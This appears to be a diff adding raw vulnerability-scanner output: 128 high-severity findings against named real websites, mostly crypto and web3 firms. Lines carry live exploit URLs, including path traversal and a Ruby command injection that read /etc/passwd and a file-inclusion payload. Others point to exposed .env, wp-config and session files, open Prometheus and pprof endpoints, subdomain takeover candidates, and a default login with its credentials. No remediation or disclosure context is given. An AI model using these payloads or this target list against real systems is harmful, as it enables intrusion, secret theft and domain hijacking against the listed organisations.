@@ -1,0 +1,128 @@
+[CVE-2019-11248] [http] [high] https://hyper-prometheous.asxn.xyz/debug/pprof/
+[CVE-2019-11248] [http] [high] https://metrics.mainnet.tempo.xyz/debug/pprof/
+[CVE-2019-11248] [http] [high] https://metrics.tempo.xyz/debug/pprof/
+[CVE-2019-11248] [http] [high] https://metrics.testnet.tempo.xyz/debug/pprof/
+[CVE-2019-11248] [http] [high] https://remote-write.switchboard.xyz/debug/pprof/
+[CVE-2019-7254] [http] [high] https://agentic-docs.polygon.technology/?c=../../../../../../etc/passwd%00
+[CVE-2020-27361] [http] [high] https://snapshots.citrea.xyz/pme/media/
+[CVE-2020-35234] [http] [high] https://documentation.fordefi.com/wp-content/plugins/easy-wp-smtp/
+[CVE-2020-35234] [http] [high] https://documentation.fordefi.com/wp-content/plugins/wp-mail-smtp-pro/
+[CVE-2020-8163] [http] [high] https://agentic-docs.polygon.technology?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
+[CVE-2021-32820] [http] [high] https://agentic-docs.polygon.technology/?layout=/etc/passwd
+[CVE-2021-39316] [http] [high] https://agentic-docs.polygon.technology/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd
+[CVE-2022-2544] [http] [high] https://download.tempo.xyz/wp/wp-content/uploads/wpjobboard/
+[CVE-2022-2544] [http] [high] https://snapshots.citrea.xyz/wp/wp-content/uploads/wpjobboard/
+[CVE-2023-6114] [http] [high] https://download.tempo.xyz/wp-content/backups-dup-lite/tmp/
+[CVE-2023-6114] [http] [high] https://snapshots.citrea.xyz/wp-content/backups-dup-lite/tmp/
+[CVE-2023-6505] [http] [high] https://download.tempo.xyz/wp-content/uploads/prime-mover-export-files/1/
+[CVE-2023-6505] [http] [high] https://snapshots.citrea.xyz/wp-content/uploads/prime-mover-export-files/1/
+[CVE-2025-13339] [http] [high] https://agentic-docs.polygon.technology/?hippoo_serve=../../../../../../../etc/passwd
+[CVE-2025-55184] [http] [high] https://app.exponent.finance/en
+[CVE-2025-55184] [http] [high] https://console.kaio.xyz/login
+[CVE-2025-55184] [http] [high] https://console.pre.kaio.xyz/login
+[CVE-2025-55184] [http] [high] https://console.stg.kaio.xyz/login
+[CVE-2025-55184] [http] [high] https://dawn.exponent.finance/en
+[CVE-2025-55184] [http] [high] https://fireworks.ai/
+[CVE-2025-55184] [http] [high] https://v2-launch.exponent.finance/en
+[CVE-2026-27771] [http] [high] https://code-p9r.edgevana.com/v2/_catalog [""repositories":["max/pwned"]"]
+[CVE-2026-39364] [http] [high] https://staking.asxn.xyz/.env?raw??
+[aws-bucket-takeover] [http] [high] https://memberships.fewcha.app ["memberships.fewcha.app"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env [paths="/.env"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env.dev.local [paths="/.env.dev.local"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env.development.local [paths="/.env.development.local"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env.example [paths="/.env.example"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env.live [paths="/.env.live"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env.local [paths="/.env.local"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env.old [paths="/.env.old"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env.prod.local [paths="/.env.prod.local"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env.production.local [paths="/.env.production.local"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env.stage [paths="/.env.stage"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env_1 [paths="/.env_1"]
+[codeigniter-env] [http] [high] https://cli.nexus.xyz/.env_sample [paths="/.env_sample"]
+[dify-ssrf-remote-upload] [http] [high] https://content.taskon.xyz/console/api/remote-files/upload
+[framer-takeover] [http] [high] https://blog.exponent.finance ["sites.framer.app"]
+[framer-takeover] [http] [high] https://bootcamp.meteora.ag
+[framer-takeover] [http] [high] https://gamechain.b3.fun ["sites.framer.app"]
+[framer-takeover] [http] [high] https://interchain.synapseprotocol.com ["sites.framer.app"]
+[framer-takeover] [http] [high] https://itch-contest1.verse8.io ["sites.framer.app"]
+[framer-takeover] [http] [high] https://kr-contest1.verse8.io ["sites.framer.app"]
+[framer-takeover] [http] [high] https://kr.monad.xyz ["sites.framer.app"]
+[framer-takeover] [http] [high] https://legal.parcl.co ["sites.framer.app"]
+[framer-takeover] [http] [high] https://onchainsummit.mellow.finance ["forgiving-pentagon-079979.framer.app"]
+[framer-takeover] [http] [high] https://points.nansen.ai ["sites.framer.app"]
+[framer-takeover] [http] [high] https://snowflake.flipsidecrypto.xyz ["magnificent-balance-420911.framer.app"]
+[framer-takeover] [http] [high] https://spin-event.verse8.io ["sites.framer.app"]
+[framer-takeover] [http] [high] https://teaser.odyssey.world ["sites.framer.app"]
+[framer-takeover] [http] [high] https://www.blog.exponent.finance ["sites.framer.app"]
+[framer-takeover] [http] [high] https://www.scroll.io
+[framer-takeover] [http] [high] https://www.ufo.fm ["sites.framer.app"]
+[framer-takeover] [http] [high] https://year-in-review-2025.edgevana.com
+[generic-env] [http] [high] https://cli.nexus.xyz/.env [paths="/.env"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.backup [paths="/.env.backup"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.bak [paths="/.env.bak"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.cli [paths="/.env.cli"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.dev [paths="/.env.dev"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.dev.local [paths="/.env.dev.local"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.development.local [paths="/.env.development.local"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.live [paths="/.env.live"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.local [paths="/.env.local"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.nexus [paths="/.env.nexus"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.old [paths="/.env.old"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.prod [paths="/.env.prod"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.prod.local [paths="/.env.prod.local"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.production [paths="/.env.production"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.production.local [paths="/.env.production.local"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.save [paths="/.env.save"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.stage [paths="/.env.stage"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env.www [paths="/.env.www"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env_1 [paths="/.env_1"]
+[generic-env] [http] [high] https://cli.nexus.xyz/.env_sample [paths="/.env_sample"]
+[generic-env] [http] [high] https://cli.nexus.xyz/api/.env [paths="/api/.env"]
+[github-takeover] [http] [high] https://alluvial.finance
+[github-takeover] [http] [high] https://bilateral.port.finance ["port-finance.github.io"]
+[github-takeover] [http] [high] https://cdn.endpoints.security.ledger.com ["ledgerhq.github.io"]
+[github-takeover] [http] [high] https://docs.psyoptions.io ["mithraiclabs.github.io"]
+[github-takeover] [http] [high] https://github-test.orderly.network ["orderlynetwork.github.io"]
+[github-takeover] [http] [high] https://proof.market.nil.foundation ["nilfoundation.github.io"]
+[github-takeover] [http] [high] https://staging-dex.orderly.network ["orderlynetwork.github.io"]
+[github-takeover] [http] [high] https://uv4ucnaea3qpq5gk8fdcz7.spiko.finance ["spiko-tech.github.io"]
+[github-takeover] [http] [high] https://www.alluvial.finance ["alluvialfinance.github.io"]
+[github-takeover] [http] [high] https://www.nil.foundation ["nilfoundation.github.io"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env [paths="/.env"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.backup [paths="/.env.backup"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.bak [paths="/.env.bak"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.cli [paths="/.env.cli"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.dev [paths="/.env.dev"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.dev.local [paths="/.env.dev.local"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.development.local [paths="/.env.development.local"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.example [paths="/.env.example"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.live [paths="/.env.live"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.local [paths="/.env.local"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.nexus [paths="/.env.nexus"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.old [paths="/.env.old"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.prod [paths="/.env.prod"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.prod.local [paths="/.env.prod.local"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.production [paths="/.env.production"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.production.local [paths="/.env.production.local"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.save [paths="/.env.save"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.stage [paths="/.env.stage"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env.www [paths="/.env.www"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env_1 [paths="/.env_1"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/.env_sample [paths="/.env_sample"]
+[laravel-env] [http] [high] https://cli.nexus.xyz/api/.env [paths="/api/.env"]
+[laravel-sessions-exposure] [http] [high] https://documentation.fordefi.com/storage/framework/sessions/
+[laravel-sessions-exposure] [http] [high] https://download.tempo.xyz/storage/framework/sessions/
+[laravel-sessions-exposure] [http] [high] https://snapshots.citrea.xyz/storage/framework/sessions/
+[leadpages-takeover] [http] [high] http://signup.brickken.com ["custom-proxy.leadpages.net"]
+[private-key-exposure] [http] [high] https://snapshots.citrea.xyz/node_modules/mqtt/test/helpers/
+[prometheus-unauth] [http] [high] https://hyper-prometheous.asxn.xyz/api/v1/status/config
+[prometheus-unauth] [http] [high] https://remote-write.switchboard.xyz/api/v1/status/config
+[prometheus-unauth] [http] [high] https://remote-write.switchboard.xyz/config
+[unify-hipath-default-login] [http] [high] https://jobs-api.polygon.technology/cgi-bin/ikon_button.exe?page=1500&button=51&line=0&eventid=0&WbmSessionId=nosession&Username=Unify&Password=1q21q2&CountryCode=en&NoSessionTimeout=false&SwitchLanguage=false [pass="1q21q2",user="Unify"]
+[wix-takeover] [http] [high] https://build.blocto.io ["pointing.wixdns.net"]
+[wix-takeover] [http] [high] https://de.segment.finance ["cdn1.wixdns.net"]
+[wix-takeover] [http] [high] https://en.pinai.io ["cdn1.wixdns.net"]
+[wix-takeover] [http] [high] https://www.build.blocto.io ["pointing.wixdns.net"]
+[wordpress-accessible-wpconfig] [http] [high] https://tokeny.com/wp-config.php.old [paths="/wp-config.php.old"]
+[wp-vault-local-file-inclusion] [http] [high] https://agentic-docs.polygon.technology/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+[wp-w3-total-cache-exposure] [http] [high] https://snapshots.citrea.xyz/wp-content/w3tc/dbcache/
